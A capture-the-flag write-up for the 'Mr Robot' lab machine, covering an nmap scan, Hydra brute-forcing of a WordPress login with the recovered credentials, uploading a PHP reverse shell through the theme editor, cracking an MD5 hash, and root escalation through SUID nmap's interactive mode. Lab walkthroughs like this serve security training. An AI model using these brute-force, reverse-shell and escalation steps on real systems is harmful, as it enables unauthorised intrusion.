# Mr Robot CTF
**Silver García**

## Nmap
```
└─# sudo nmap -A 10.10.231.82
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-17 23:37 UTC
Nmap scan report for ip-10-10-231-82.eu-west-1.compute.internal (10.10.231.82)
Host is up (0.00058s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
MAC Address: 02:1D:D8:EC:79:D1 (Unknown)
Device type: general purpose|specialized|storage-misc|broadband router|printer|WAP
Running (JUST GUESSING): Linux 3.X|4.X|5.X|2.6.X (95%), Crestron 2-Series (89%), HP embedded (89%), Asus embedded (88%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5.4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:3.4 cpe:/o:linux:linux_kernel:2.6.22
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 or 4.2 (90%), Linux 3.2 - 3.5 (90%), Linux 3.2 - 3.8 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Linux 5.4 (90%), Crestron XPanel control system (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.58 ms ip-10-10-231-82.eu-west-1.compute.internal (10.10.231.82)
```
## Gobuster
On gobuster.txt

**fsocity.dic found on /fsocity.dic**

## Getting access to CMS
We'll use the dictionary file to get the username and password on the /login page.
First we remove duplicate lines of the dictionary.
```
sort -u fsocity.dic
```

Hydra to do brute force
```
hydra -L fsocity-small.dic -p "a" 10.10.231.82 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -I
```
Result:
[80][http-post-form] host: 10.10.231.82   login: ELLIOT   password: a
[80][http-post-form] host: 10.10.231.82   login: Elliot   password: a

Now we use the same dictionary to get the password
```
hydra -l elliot -P fsocity-small.dic 10.10.231.82 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -I
```
Result:
[80][http-post-form] host: 10.10.231.82   login: elliot   password: ER28-0652

## CMS
## Getting reverse shell uploading the next code: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php in Appearance -> Editor -> 404 Template and visit the page to execute it

## Privilege escalation to robot
File /home/robot/password.raw-md5
```
robot:c3fcd3d76192e4007dfb496cca67e13b
```
Using MD5 cracker: abcdefghijklmnopqrstuvwxyz

Spawn shell:
```
python -c 'import pty; pty.spawn("/bin/sh")'
```

Switch to robot user with password above:
```
su robot
```

## Privilege escalation to root
Check SUID binaries
```
$ find / -perm -4000 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
**/usr/local/bin/nmap**
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

Get root shell with interactive nmap
1.
```
nmap --interactive
```
2.
```
!sh!
```
3.
```
whoami
```
